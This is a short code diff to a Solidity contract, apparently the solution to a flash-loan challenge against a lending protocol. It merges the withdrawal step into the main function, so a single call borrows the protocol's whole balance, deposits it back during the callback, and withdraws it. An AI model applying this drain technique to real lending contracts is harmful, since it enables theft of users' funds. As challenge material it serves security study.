@@ -15,7 +15,7 @@ contract LendingProtocolSolution {
         address token = lendingProtocol.token();
         uint256 amount = IERC20(token).balanceOf(address(lendingProtocol));
         lendingProtocol.flashloan(amount);
-        
+        lendingProtocol.withdraw(amount);
     }
     function onFlashLoan(
         address,
@@ -27,11 +27,6 @@ contract LendingProtocolSolution {
         IERC20(token).approve(address(lendingProtocol), amount);
         lendingProtocol.supply(amount);
         return bytes32(0);
-    }
-
-    function solveSecondHalf() public {
-        uint256 amount = lendingProtocol.supplied(address(this));
-        lendingProtocol.withdraw(amount);
     }
 
 }
